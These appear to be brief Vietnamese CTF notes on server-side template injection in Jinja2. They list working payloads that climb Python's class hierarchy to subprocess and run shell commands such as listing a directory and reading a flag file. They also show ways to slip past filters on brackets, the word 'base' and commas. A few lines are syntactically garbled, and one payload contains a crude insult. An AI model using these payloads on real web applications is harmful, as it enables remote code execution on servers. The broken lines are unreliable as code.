SSTI bypass ',' filter 1 cái gì đó như base subclass.... hay filter '' "" ....


Filter [], base 
Jinja2
{{ [0].\_\_class__["\_\_bASe__".lower()].\_\_subclasses__()[262]\(["ls","/home/NinjaWorld/chall"],stdout=-1).communicate() }}

Python bth
getattr("[0].\_\_class__","["\_\_bASe__".lower()].\_\_subclasses__()[262]\(["ls","/home/NinjaWorld/chall"],stdout=-1).communicate()")

Gọi 1 object bất kì như là [0] hay ['aaaa'], chuyển toàn bộ bằng hàm lower rồi ghép chữ


Filter dấu , 

{{ [ditmemayhuuduc].\_\_class__["\_\_bASe__".lower()].\_\_subclasses__()[262]\(\*(["cat#/home/NinjaWorld/chall/flaggggggggggggggggg.txt".split('#')]+[-1]+[None]+[None]+[-1])).communicate() }}

nhiều cách chr(44), \x2c, []+[], "a#b".split("#") > [a,b]

\*(["cat#/home/NinjaWorld/chall/flaggggggggggggggggg.txt".split('#')]+[-1]+[None]+[None]+[-1])) 
tương đương
(["cat","/home/NinjaWorld/chall/flaggggggggggggggggg.txt".split('#')"],stdout=-1)

